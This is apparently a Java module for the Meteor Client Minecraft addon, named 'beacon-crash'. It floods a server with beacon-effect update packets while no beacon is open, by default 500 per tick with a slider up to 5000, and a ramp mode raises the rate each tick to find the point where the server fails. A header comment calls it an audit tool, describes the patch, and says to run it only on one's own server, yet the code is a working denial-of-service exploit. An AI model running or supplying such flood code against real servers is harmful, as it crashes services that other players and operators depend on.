package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.UpdateBeaconC2SPacket;

import java.util.Optional;

/**
 * AUDIT: Beacon Payment Flood
 *
 * Floods UpdateBeaconC2SPacket - the "set beacon effects" packet - with no
 * beacon GUI legitimately open. The server normally processes this only against
 * the beacon container the player has open and after validating the payment item;
 * a handler that acts on the packet without confirming an open beacon menu (or
 * without rate-limiting it) does needless work per packet and can be driven hard.
 *
 * Patch signal: only honor a beacon update when the player has the matching
 * beacon container open, validate the requested effects against the beacon's
 * tier, consume the payment atomically, and rate-limit the packet.
 *
 * Run against your OWN local server only.
 */
public class BeaconCrash extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(500).min(1).sliderMax(5000).build()
    );
    private final Setting<Boolean> rampMode = sgGeneral.add(new BoolSetting.Builder()
        .name("ramp-mode")
        .description("Auto-increment rate each tick to find the server's threshold. Starts at 1, steps up by ramp-step each tick.")
        .defaultValue(false).build()
    );
    private final Setting<Integer> rampStep = sgGeneral.add(new IntSetting.Builder()
        .name("ramp-step").description("Rate increase per tick in ramp mode.")
        .defaultValue(10).range(1, 500).sliderRange(1, 100)
        .visible(rampMode::get).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int currentRate = 1;

    public BeaconCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "beacon-crash",
            "Floods beacon-effect update packets with no beacon open. Tests beacon update gating + rate limiting.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; currentRate = 1; }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        int rate = rampMode.get() ? currentRate : amount.get();
        if (rampMode.get()) currentRate += rampStep.get();
        for (int i = 0; i < rate; i++) {
            mc.player.networkHandler.sendPacket(new UpdateBeaconC2SPacket(Optional.empty(), Optional.empty()));
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            if (rampMode.get()) info("  Ramp: peak rate sent was %d/tick", currentRate - rampStep.get());
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
